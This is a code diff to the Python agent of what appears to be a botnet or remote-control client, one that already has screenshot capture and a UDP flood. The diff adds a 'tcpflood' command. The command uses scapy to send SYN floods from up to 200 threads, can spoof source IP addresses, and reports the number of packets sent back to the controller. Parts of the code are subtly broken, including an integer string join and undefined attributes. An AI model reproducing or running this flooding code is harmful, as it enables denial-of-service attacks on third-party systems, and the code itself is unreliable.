@@ -1,6 +1,9 @@
 #!/usr/bin/env python3
 # coding: utf-8
 
+import random
+from scapy.all import IP, TCP, send
+
 import config
 import ctypes
 import getpass
@@ -23,6 +26,8 @@ if os.name == 'nt':
     from PIL import ImageGrab
 else:
     import pyscreenshot as ImageGrab
+
+forging = True
 
 
 def threaded(func):
@@ -293,6 +298,56 @@ class Agent(object):
             udp_socket.sendto(payload, (ip, port))
             sent += 1
 
+    @threaded
+    def tcpflood(self, ip, port, duration, spoofing=False):
+        forging = True
+        class send_syn(threading.Thread):
+
+            def __init__(self):
+                threading.Thread.__init__(self)
+
+            def run(self):
+                # Damn, ugly!
+                global forging
+
+                if forging:
+                    i = IP()
+                    i.dst = ip
+                    if spoofing:
+                        i.src = '.'.join(random.randint(1, 254) for _ in range(4))
+
+                    t = TCP()
+                    t.sport = random.randint(1, 65535)
+                    t.dport = port
+                    t.flags = 'S'
+
+                    try:
+                        send(i/t, verbose=0)
+                    except PermissionError:
+                        print('ohno, not forging')
+                        forging = False
+
+                else:
+                    s = socket.socket()
+                    s.connect((self.ip, self.port))
+
+        timeout = time.time() + duration
+        sent = 0
+        thread_limit = 200
+
+        # Test if packets can be forged
+        send_syn().start()
+
+        while True:
+            if time.time() > timeout:
+                s = 'Attack on {0} has finished. Total packages sent: {1}'
+                self.send_output(s.format(ip, sent))
+                return
+
+            if threading.activeCount() < thread_limit:
+                send_syn().start()
+                sent += 1
+
     def help(self):
         """ Displays the help """
         self.send_output(config.HELP)
@@ -392,6 +447,20 @@ class Agent(object):
                                     self.send_output('[error] Not a valid duration')
                                 else:
                                     self.udpflood(ip, int(port), int(duration))
+
+                        elif command == 'tcpflood':
+                            if not args or len(args) != 3:
+                                self.send_output('usage: tcpflood <ip> <port> <duration in seconds>')
+                            else:
+                                ip, port, duration = args
+                                if not re.match(r'\d+\.\d+\.\d+\.\d+$', ip):
+                                    self.send_output('[error] Not a valid IP')
+                                elif not port:
+                                    self.send_output('[error] Not a valid port')
+                                elif not duration:
+                                    self.send_output('[error] Not a valid duration')
+                                else:
+                                    self.tcpflood(ip, int(port), int(duration))
 
                         elif command == 'help':
                             self.help()
